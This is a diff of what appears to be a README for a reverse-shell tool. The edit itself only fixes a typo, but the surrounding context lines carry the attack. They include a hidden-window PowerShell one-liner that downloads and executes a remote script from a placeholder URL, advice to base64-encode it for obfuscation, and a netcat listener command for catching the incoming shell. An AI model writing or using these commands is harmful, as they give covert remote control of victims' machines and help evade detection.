@@ -23,7 +23,7 @@ You need to modify the code the "client" runs so their terminal can build a conn
 
 `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://myurl.com/script.php?i=xxx.xxx.xxx&p=xxxx')"`
 
-To create a layer of obsucation, you can encrypt this string in base64 on sites [like these](https://raikia.com/tool-powershell-encoder/). Make sure to read the notes down below!
+To create a layer of obfuscation, you can encrypt this string in base64 on sites [like these](https://raikia.com/tool-powershell-encoder/). Make sure to read the notes down below!
 
 You can listen to the shell by using `nc -nlvp PORT`. You need to have nc (netcat) installed and change `PORT` to whatever port you made the "client" ping to.
 
